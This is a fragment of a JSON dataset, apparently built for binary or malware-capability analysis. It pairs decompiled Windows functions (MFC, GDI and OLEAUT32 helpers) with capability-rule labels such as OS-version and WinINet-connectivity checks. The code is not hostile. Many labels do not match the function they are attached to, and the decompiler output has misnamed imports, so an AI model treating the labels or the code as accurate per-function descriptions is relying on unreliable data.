            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00436793(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004367c9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004367c9(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0x88;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.004182f8(\"ImageList_Write\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 138
    },
    "0043686f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0043686f(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "004368a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004368a5(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0xa0;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.004182f8(\"ImageList_Merge\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 139
    },
    "00436957": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00436957(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "0043698d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043698d(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0xcc;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.004182f8(\"MakeDragList\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 137
    },
    "00436a30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00436a30(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00436a66": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00436a66(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0xd4;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.004182f8(\"LBItemFromPt\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 139
    },
    "00436d1f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00436d1f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004627af(0);\n    iVar1 = fcn.004302e1();\n    if ((*(iVar1 + 0x24) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00411567(0x430517);\n        iVar3 = fcn.00411579(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00432b3c(0x496910, 0x43643e, 0x435c7e, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x24) = uVar4;\n        fcn.00411567(uVar2);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 311
    },
    "00436dbd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00436dbd(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00436d93();\n    uVar1 = fcn.00436b70(uVar1);\n    return uVar1;\n}\n",
        "token_count": 84
    },
    "00437b43": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437b43(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    \n    if (arg_8h == 2) {\n        fcn.0041b0e0();\n        if ((*(in_ECX + 0x164) & 0x40) != 0) {\ncode_r0x00437bf1:\n            fcn.00418521();\n            return;\n        }\n        iVar2 = 1;\n        iVar1 = 0;\n        do {\n            if (*(in_ECX + 0x184) <= iVar2) break;\n            iVar1 = fcn.004379c1();\n            iVar2 = iVar2 + 1;\n        } while (iVar1 == 0);\n        if (iVar1 != 0) goto code_r0x00437b8c;\n    }\n    else {\n        if (7 < arg_8h - 10U) goto code_r0x00437bf1;\n        fcn.0041b0e0();\n        iVar2 = 1;\n        iVar1 = 0;\n        do {\n            if (*(in_ECX + 0x184) <= iVar2) break;\n            iVar1 = fcn.004379c1();\n            iVar2 = iVar2 + 1;\n        } while (iVar1 == 0);\n        if ((iVar1 != 0) && (*(iVar1 + 0x90) != NULL)) {\n            (**(**(iVar1 + 0x90) + 4))(arg_8h, arg_ch, arg_10h);\n            return;\n        }\n    }\n    do {\n        iVar1 = fcn.00411e42();\ncode_r0x00437b8c:\n    } while (*(iVar1 + 0x90) == 0);\n    (****(iVar1 + 0x90))(arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 440
    },
    "00437d37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00437d37(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (0xffff < param_1) {\n        param_1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_1 + 0x20));\n        param_1 = param_1 & 0xffff;\n    }\n    iVar1 = fcn.00437984(param_1, 0xffffffff);\n    if (0 < iVar1) {\n        fcn.0044be28(iVar1, 1);\n        piVar2 = fcn.00437755(iVar1 + -1);\n        if (*piVar2 == 0) {\n            piVar2 = fcn.00437755(iVar1);\n            if (*piVar2 == 0) {\n                fcn.0044be28(iVar1, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00438751": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00438751(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint unaff_ESI;\n    uint uFlags;\n    uchar auStack308 [16];\n    int32_t iStack292;\n    int32_t iStack288;\n    int32_t iStack284;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [88];\n    uchar auStack180 [172];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack180;\n    iStack288 = param_2;\n    iStack292 = param_3;\n    if (param_1 != 0) goto code_r0x0043878c;\n    do {\n        fcn.00411e42();\ncode_r0x0043878c:\n    } while (param_2 == 0);\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(param_2 + 0x20), auStack308);\n    if (*(param_2 + 0x8c) == param_1) {\n        if (param_3 == 0) goto code_r0x00438977;\n        iVar2 = (*_sym.imp.USER32.dll_EqualRect)(auStack308, param_3);\n        if (iVar2 != 0) goto code_r0x00438977;\n    }\n    if ((*(param_1 + 0x94) != 0) && ((*(param_2 + 0x84) & 0x40) != 0)) {\n        *(param_1 + 0x80) = *(param_1 + 0x80) | 0x40;\n    }\n    *(param_1 + 0x80) = *(param_1 + 0x80) & 0xfffffff9;\n    uVar3 = *(param_1 + 0x80);\n    *(param_1 + 0x80) = *(param_2 + 0x80) & 6 | uVar3;\n    if ((uVar3 & 0x40) == 0) {\n        fcn.0041c69d(auStack268, 0x104);\n        fcn.0043042c(*(param_1 + 0x20), auStack268);\n    }\n    uVar3 = (*(param_2 + 0x80) ^ *(param_1 + 0x80)) & 0xf000 ^ *(param_2 + 0x80);\n    if (*(param_1 + 0x94) == 0) {\n        uVar3 = uVar3 & 0xfffffffe | 0xf00;\n    }\n    else {\n        uVar3 = uVar3 | 0xf01;\n    }\n    fcn.00433452(uVar3);\n    uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_2 + 0x20), 0xffffffff);\n    iVar2 = fcn.00437984(uVar1);\n    if (0 < iVar2) {\n        piVar4 = fcn.00437755(iVar2);\n        *piVar4 = param_2;\n    }\n    if (iStack292 == 0) {\n        if (iVar2 < 1) {\n            fcn.0044bd54(*(param_1 + 0xa0), param_2);\n            fcn.0044bd54(*(param_1 + 0xa0), 0);\n        }\n        uFlags = 0x115;\n        iStack272 = 0;\n        iStack276 = 0;\n        iStack280 = -*0x4bb5ec;\n        iStack284 = -*0x4bb5e8;\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack284, iStack292);\n        fcn.0042dd8a();\n        if (iVar2 < 1) {\n            fcn.004379e0(iStack288, iStack284, iStack280, iStack276, iStack272, (iStack276 - iStack284) / 2 + iStack284\n                         , (iStack272 - iStack280) / 2 + iStack280);\n            param_2 = iStack288;\n        }\n        iStack272 = iStack272 - iStack280;\n        uFlags = 0x114;\n        iStack276 = iStack276 - iStack284;\n    }\n    fcn.0041c2a1(0, iStack284, iStack280, iStack276, iStack272, uFlags);\n    (*_sym.imp.USER32.dll_GetParent)(*(param_2 + 0x20));\n    iVar2 = fcn.004185c5();\n    if (iVar2 != param_1) {\n        fcn.004377d1(param_1);\n    }\n    if (*(param_2 + 0x8c) != 0) {\n        fcn.00437d9e(param_2, 0xffffffff, 0);\n    }\n    *(param_2 + 0x8c) = param_1;\n    iVar2 = fcn.0041fab8();\n    *(iVar2 + 0xd0) = *(iVar2 + 0xd0) | 0xc;\ncode_r0x00438977:\n    fcn.0045e747(unaff_ESI);\n    return;\n}\n",
        "token_count": 1229
    },
    "00438bcf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438bcf(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x4bb5f4;\n    uVar3 = *0x4bb5f0;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.0042dfe0(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, 0x9ec, uVar3);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], 0x9ec, uVar4);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 359
    },
    "00438c5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438c5d(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x4bb5f4;\n    uVar3 = *0x4bb5f0;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.0042df77(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, uVar3, 0x9ec);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], uVar4, 0x9ec);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 359
    },
    "00439549": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439549(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    int32_t var_3ch;\n    uint var_20h;\n    \n    if (arg_8h == 0) {\n        fcn.00411e42();\n    }\n    var_48h = arg_14h;\n    var_4ch = 1;\n    if (arg_ch != 0) {\n        var_4ch = 5;\n        var_3ch = arg_ch;\n    }\n    if (arg_10h != 0) {\n        var_20h = *(arg_10h + 4);\n        var_4ch = var_4ch | 0x80;\n    }\n    fcn.0043944f(arg_8h, &var_50h);\n    return;\n}\n",
        "token_count": 220
    },
    "00439b37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439b37(int16_t *plLbound, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t cDims;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    piVar2 = plLbound;\n    if ((*plLbound != 0x2011) || (iVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(plLbound + 4)),  iVar3 != 1))\n    {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(piVar2);\n        var_8h = 0;\n        cDims = arg_ch;\n        *piVar2 = 0x2011;\n        iVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayDestroy)(0x11, 1, &cDims);\n        *(piVar2 + 4) = iVar3;\n        if (iVar3 != 0) {\n            return;\n        }\n        fcn.00411e0e();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(piVar2 + 4), 1, &var_4h);\n    fcn.0043988c(uVar4);\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(piVar2 + 4), 1, &plLbound);\n    fcn.0043988c(uVar4);\n    iVar3 = plLbound - var_4h;\n    if (iVar3 < 0) {\n        iVar3 = 0;\n    }\n    if (iVar3 == arg_ch) {\n        return;\n    }\n    cDims = arg_ch;\n    var_8h = var_4h;\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayAllocDescriptorEx)(*(piVar2 + 4), &cDims);\n    fcn.0043988c(uVar4);\n    return;\n}\n",
        "token_count": 487
    },
    "00439e63": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439e63(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        if ((arg_8h == 0) || (arg_ch == 0)) {\n            fcn.00411e42();\n        }\n        do {\n            arg_10h = arg_10h + -1;\n            fcn.00439e30();\n        } while (arg_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "0043a1c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0043a1c2(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        fcn.00462290(param_1, 0, 0x18);\n    }\n    return;\n}\n",
        "token_count": 55
    },
    "0043a470": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0043a470(ulong *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 1) == 0) && (iVar1 = (*_sym.imp.OLEAUT32.dll_UnRegisterTypeLib)(*param_1, param_2),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0043a62e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a62e(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(*(in_ECX + 8), &var_ch);\n    fcn.0043988c(uVar1);\n    iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar2 == 1) {\n        (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(in_ECX + 8), 1, &var_8h);\n        (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(in_ECX + 8), 1, &var_4h);\n        iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        iVar2 = iVar2 * ((var_4h - var_8h) + 1);\n        fcn.0044bf7a(iVar2, 0xffffffff);\n        fcn.0041314e(*(arg_8h + 4), iVar2, var_ch, iVar2);\n    }\n    else {\n        fcn.0044bf7a(0, 0xffffffff);\n    }\n    (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(*(in_ECX + 8));\n    return;\n}\n",
        "token_count": 360
    },
    "0043ab67": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ab67(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(*(in_ECX + 8), &var_ch);\n    fcn.0043988c(uVar1);\n    iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar2 == 1) {\n        (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(in_ECX + 8), 0, &var_8h);\n        (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(in_ECX + 8), 0, &var_4h);\n        iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        iVar2 = iVar2 * ((var_4h - var_8h) + 1);\n        fcn.0044bf7a(iVar2, 0xffffffff);\n        fcn.0041314e(*(arg_8h + 4), iVar2, var_ch, iVar2);\n    }\n    else {\n        fcn.0044bf7a(0, 0xffffffff);\n    }\n    (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(*(in_ECX + 8));\n    return;\n}\n",
        "token_count": 359
    },
    "0043ac01": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043ac01(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uStack28;\n    uint *puStack24;\n    uint uStack20;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack20 = *(param_1 + 8);\n    puStack24 = 0x43ac12;\n    var_8h = param_1;\n    var_4h = param_1;\n    iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)();\n    if (iVar2 != 1) {\n        uStack28 = 0x4b62b8;\n        puStack24 = &stack0xfffffffc;\n        fcn.0046230a(&stack0xffffffe4, 0x4a76e8);\n        pcVar1 = swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    puStack24 = &fcn.0043ac01::var_4h;\n    uStack28 = 1;\n    fcn.0043a0f4();\n    fcn.0043a0da(1, &fcn.0043ac01::var_8h);\n    return (var_4h - var_8h) + 1;\n}\n",
        "token_count": 304
    },
    "0043ac40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ac40(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar1 != 1) {\n        fcn.00411e42();\n    }\n    var_4h = 0;\n    var_8h = arg_8h;\n    fcn.0043a15c(&var_8h);\n    return;\n}\n",
        "token_count": 137
    },
    "0043ac75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043ac75(uint16_t *param_1, uint32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint16_t uVar4;\n    \n    if ((param_3 != 0) && (param_4 != 0)) {\n        uVar4 = param_2;\n        if (((param_2 & 0x7000) == 0) && ((uVar4 != 0 && (uVar4 != 1)))) {\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(param_1);\n            iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayDestroy)(param_2, param_3, param_3);\n            *(param_1 + 4) = iVar2;\n            if (iVar2 == 0) {\n                iVar2 = fcn.00411e0e();\n            }\n            *param_1 = uVar4 | 0x2000;\n            *(param_1 + 10) = param_3;\n            uVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(iVar2);\n            *(param_1 + 8) = uVar3;\n            return;\n        }\n    }\n    fcn.00411e42();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 325
    },
    "0043b3d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
